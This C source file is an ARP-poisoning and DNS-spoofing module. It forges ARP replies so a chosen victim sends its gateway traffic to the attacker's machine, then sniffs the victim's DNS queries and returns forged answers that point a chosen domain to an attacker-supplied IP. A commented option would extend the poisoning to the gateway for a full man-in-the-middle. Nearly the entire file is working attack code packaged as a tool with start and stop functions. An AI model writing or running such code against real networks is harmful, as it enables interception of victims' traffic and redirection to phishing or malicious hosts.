#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include "dns_spoofer.h"

// ARP Packet Structure
typedef struct {
    uint16_t htype; // Hardware type
    uint16_t ptype; // Protocol type
    uint8_t hlen;   // Hardware address length
    uint8_t plen;   // Protocol address length
    uint16_t oper;  // Operation code
    uint8_t sha[6]; // Sender hardware address
    uint8_t spa[4]; // Sender protocol address
    uint8_t tha[6]; // Target hardware address
    uint8_t tpa[4]; // Target protocol address
} __attribute__((packed)) arp_hdr_t;

// DNS Header
typedef struct {
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
} __attribute__((packed)) dns_hdr_t;

// Helper to parse MAC string to bytes
static void parse_mac(const char *mac_str, uint8_t *mac_bytes) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], 
           &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]);
}

// Get Interface MAC and index (we need our own MAC for poisoning)
static int get_iface_info(const char *iface, uint8_t *mac, int *if_index) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        close(s);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        close(s);
        return -1;
    }
    *if_index = ifr.ifr_ifindex;

    close(s);
    return 0;
}

// Construct and send ARP Poison packet
// op: 2 (Reply)
// sender_mac: Our MAC (faked as gateway)
// sender_ip: Gateway IP
// target_mac: Victim MAC
// target_ip: Victim IP
static void send_arp(int sock, int if_index, uint8_t *src_mac, uint8_t *dst_mac, 
                     const char *src_ip_str, const char *dst_ip_str, uint16_t op) {
    char packet[42]; // Eth(14) + ARP(28)
    struct ethhdr *eth = (struct ethhdr *)packet;
    arp_hdr_t *arp = (arp_hdr_t *)(packet + 14);

    // Ethernet Header
    memcpy(eth->h_dest, dst_mac, 6);
    memcpy(eth->h_source, src_mac, 6);
    eth->h_proto = htons(ETH_P_ARP);

    // ARP Header
    arp->htype = htons(1); // Ethernet
    arp->ptype = htons(ETH_P_IP);
    arp->hlen = 6;
    arp->plen = 4;
    arp->oper = htons(op);
    
    memcpy(arp->sha, src_mac, 6);
    if (inet_pton(AF_INET, src_ip_str, arp->spa) != 1) return;
    
    memcpy(arp->tha, dst_mac, 6);
    if (inet_pton(AF_INET, dst_ip_str, arp->tpa) != 1) return;

    // Send
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_index;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, dst_mac, 6);

    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll));
}

// DNS Parsing helper
// Returns pointer to end of query name/question
static uint8_t* skip_dns_name(uint8_t *ptr, uint8_t *end) {
    while (ptr < end && *ptr != 0) {
        int len = *ptr;
        ptr += len + 1;
    }
    if (ptr < end && *ptr == 0) return ptr + 1;
    return ptr; // Error
}

// Main spoofing loop
void *spoofing_thread(void *arg) {
    spoof_session_t *sess = (spoof_session_t *)arg;
    uint8_t my_mac[6];
    uint8_t target_mac[6];
    uint8_t gateway_mac[6]; // Not strictly needed for poisoning target, but good for poisoning gateway if we wanted bidirectionnal
    int if_index;
    
    // Auto-detect interface (simplified: use first non-loopback usually, but here hardcoded or common "eth0"/"wlan0")
    // Let's iterate or assume a default. Since "network_scan.c" probably knows, but here we'll try common ones.
    const char *iface = "wlan0"; // Most likely for laptop. Could be eth0.
    // Try to detect interface via gateway reachability or just cycle common names.
    if (get_iface_info("eth0", my_mac, &if_index) == 0) iface = "eth0";
    else if (get_iface_info("wlan0", my_mac, &if_index) == 0) iface = "wlan0";
    else if (get_iface_info("enp3s0", my_mac, &if_index) == 0) iface = "enp3s0";
    // else printf("Error: No interface found\n");
    
    // Re-get for selected iface
    get_iface_info(iface, my_mac, &if_index);
    parse_mac(sess->target_mac, target_mac);
    parse_mac(sess->gateway_mac, gateway_mac);

    // Socket for sending ARP and Sniffing DNS (we need RAW socket for DNS sniff)
    int sock_arp = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    int sock_sniff = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));

    if (sock_arp < 0 || sock_sniff < 0) {
        perror("Socket creation failed");
        sess->active = 0;
        return NULL;
    }

    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 100000; // 100ms timeout
    setsockopt(sock_sniff, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    int arp_counter = 0;
    uint8_t buffer[2048];

    while (!sess->stop_signal) {
        // 1. Send ARP Poison (Mapping Gateway IP -> My MAC) to Target
        // Frequency: Every 1 second (approx 10 loops)
        if (arp_counter++ % 10 == 0) {
            send_arp(sock_arp, if_index, my_mac, target_mac, sess->gateway_ip, sess->target_ip, 2);
            // Optionally poison gateway too (Mapping Target IP -> My MAC) to be Man-In-The-Middle full
            // send_arp(sock_arp, if_index, my_mac, gateway_mac, sess->target_ip, sess->gateway_ip, 2);
        }

        // 2. Sniff & Spoof DNS
        ssize_t len = recv(sock_sniff, buffer, sizeof(buffer), 0);
        if (len > 0) {
            struct ethhdr *eth = (struct ethhdr *)buffer;
            if (eth->h_proto == htons(ETH_P_IP)) {
                struct iphdr *ip = (struct iphdr *)(buffer + 14);
                if (ip->protocol == IPPROTO_UDP) {
                    struct udphdr *udp = (struct udphdr *)(buffer + 14 + (ip->ihl * 4));
                    // Check if DNS query (Port 53) from Target
                    if (ntohs(udp->dest) == 53) {
                        // Check source IP matches target (we only want to spoof our target)
                        char src_ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &ip->saddr, src_ip_str, INET_ADDRSTRLEN);
                        if (strcmp(src_ip_str, sess->target_ip) == 0) {
                             // Parse DNS
                             uint8_t *dns_packet = (uint8_t *)(udp + 1); // Pointer arithmetic on struct udphdr pointer
                             dns_hdr_t *dns = (dns_hdr_t *)dns_packet;
                             
                             // Very basic parsing: check if query contains our domain
                             // Note: Domain in DNS is length-prefixed: 3www6google3com0
                             // We will just do a strstr on the packet payload for simplicity for this POC
                             // or verify QName if we want to be clean.
                             
                             // Let's inspect the Query
                             uint8_t *qname = dns_packet + sizeof(dns_hdr_t);
                             // To convert qname to string for check:
                             char qname_str[256] = {0};
                             int q_idx = 0;
                             uint8_t *ptr = qname;
                             while (*ptr != 0 && q_idx < 255) {
                                  int seg_len = *ptr;
                                  ptr++;
                                  for(int k=0; k<seg_len; k++) {
                                      if (q_idx > 0 && qname_str[q_idx-1] != '.') { 
                                          // Add dot if needed (logic simplified)
                                      }
                                      qname_str[q_idx++] = *(ptr++);
                                  }
                                  qname_str[q_idx++] = '.';
                             }
                             if (q_idx > 0) qname_str[q_idx-1] = '\0'; // Remove trailing dot
                             
                             // Does it match?
                             if (strstr(qname_str, sess->spoof_domain) != NULL ||
                                 strstr(sess->spoof_domain, qname_str) != NULL) { // Loose match
                                 
                                 // SEND RESPONSE
                                 // We need to craft a response packet
                                 // For simplicity, we can just modify the received packet and send it back to src
                                 // But we need to swap IP/MAC/Ports
                                 
                                 // TODO: Construct valid DNS response
                                 // This is non-trivial in a short snippet.
                                 // Simplified strategy:
                                 // 1. Swap Eth Addrs
                                 // 2. Swap IP Addrs
                                 // 3. Swap UDP Ports
                                 // 4. DNS: Set QR=1 (Response), AA=1, RA=1. Keep Questions. Add Answer.
                                 
                                 // Prepare Buffer (Reuse)
                                 uint8_t reply[1024];
                                 memcpy(reply, buffer, len);
                                 
                                 struct ethhdr *reth = (struct ethhdr *)reply;
                                 struct iphdr *rip = (struct iphdr *)(reply + 14);
                                 struct udphdr *rudp = (struct udphdr *)(reply + 14 + (ip->ihl * 4));
                                 dns_hdr_t *rdns = (dns_hdr_t *)(reply + 14 + (ip->ihl * 4) + 8);
                                 
                                 // Eth
                                 memcpy(reth->h_dest, eth->h_source, 6); // To Victim
                                 memcpy(reth->h_source, my_mac, 6);      // From Me (Impersonating Gateway/DNS) or Gateway MAC?
                                 // If we poisoned, Victim thinks Gateway MAC is My MAC.
                                 // Victim sent packet to Gateway IP (dest mac = My MAC).
                                 // We reply. Source MAC = My MAC. Source IP = DNS Server IP (which was destination).
                                 
                                 // IP
                                 rip->daddr = ip->saddr;
                                 rip->saddr = ip->daddr;
                                 rip->check = 0; // Kernel will calc? No, RAW. But usually optional on receive, important on send.
                                 // Recalc IP Checksum if needed or just 0.
                                 
                                 // UDP
                                 rudp->dest = udp->source;
                                 rudp->source = udp->dest;
                                 rudp->check = 0; // Optional in IPv4
                                 
                                 // DNS Header
                                 rdns->flags = htons(0x8180); // Std Reply, No Error
                                 rdns->ans_count = htons(1);
                                 
                                 // Get pointer to end of Queries (We preserved the query)
                                 uint8_t *ans_ptr = reply + (len - (sizeof(buffer) - len)); // Wait, we copied len bytes.
                                 // The packet ends at 'len'. We need to append answer.
                                 // Let's recalculate packet end from original length inside reply buffer
                                 ans_ptr = reply + len; // Appending at end
                                 
                                 // Answer: Name Pointer (0xC00c pointing to start of question)
                                 *ans_ptr++ = 0xC0;
                                 *ans_ptr++ = 0x0C;
                                 
                                 // Type A (1)
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x01;
                                 
                                 // Class IN (1)
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x01;
                                 
                                 // TTL (60 sec)
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x3C;
                                 
                                 // RDLENGTH (4 bytes for IPv4)
                                 *ans_ptr++ = 0x00;
                                 *ans_ptr++ = 0x04;
                                 
                                 // IP Address
                                 inet_pton(AF_INET, sess->redirect_ip, ans_ptr);
                                 ans_ptr += 4;
                                 
                                 // Update IP Total Desc
                                 int new_len = ans_ptr - reply;
                                 rip->tot_len = htons(new_len - 14);
                                 rudp->len = htons(new_len - 14 - (ip->ihl*4));
                                 
                                 // Send Reply
                                 struct sockaddr_ll sll_reply;
                                 memset(&sll_reply, 0, sizeof(sll_reply));
                                 sll_reply.sll_family = AF_PACKET;
                                 sll_reply.sll_ifindex = if_index;
                                 sll_reply.sll_halen = 6;
                                 memcpy(sll_reply.sll_addr, reth->h_dest, 6);
                                 
                                 if (sendto(sock_sniff, reply, new_len, 0, (struct sockaddr *)&sll_reply, sizeof(sll_reply)) < 0) {
                                     perror("Send DNS Reply failed");
                                 } else {
                                     // printf("Spoofed DNS for %s -> %s\n", sess->spoof_domain, sess->redirect_ip);
                                 }
                             }
                        }
                    }
                }
            }
        }
    }

    close(sock_arp);
    close(sock_sniff);
    return NULL;
}

int start_spoofing(device_t *target, const char *gateway_ip, const char *gateway_mac, const char *domain, const char *redirect_ip) {
    if (target->is_being_spoofed) return 0; // Already active

    spoof_session_t *sess = malloc(sizeof(spoof_session_t));
    if (!sess) return -1;
    
    strncpy(sess->target_ip, target->ip_str, INET_ADDRSTRLEN);
    strncpy(sess->target_mac, target->mac_addr, 18);
    strncpy(sess->gateway_ip, gateway_ip, INET_ADDRSTRLEN);
    
    // Gateway MAC might not be in device struct if not scanned/passed explicitely.
    // For now, we assume user/logic provides it or we scan it. 
    // If passed as arg is valid.
    strncpy(sess->gateway_mac, gateway_mac, 18);
    
    strncpy(sess->spoof_domain, domain, 255);
    strncpy(sess->redirect_ip, redirect_ip, INET_ADDRSTRLEN);
    
    sess->active = 1;
    sess->stop_signal = 0;
    
    target->spoof_data = sess;
    target->is_being_spoofed = 1;
    strcpy(target->spoof_domain, domain);
    strcpy(target->spoof_redirect_ip, redirect_ip);
    
    pthread_create(&sess->thread_id, NULL, spoofing_thread, sess);
    return 0;
}

void stop_spoofing(device_t *target) {
    if (!target->is_being_spoofed || !target->spoof_data) return;
    
    spoof_session_t *sess = (spoof_session_t *)target->spoof_data;
    sess->stop_signal = 1;
    pthread_join(sess->thread_id, NULL);
    
    target->is_being_spoofed = 0;
    free(sess);
    target->spoof_data = NULL;
}
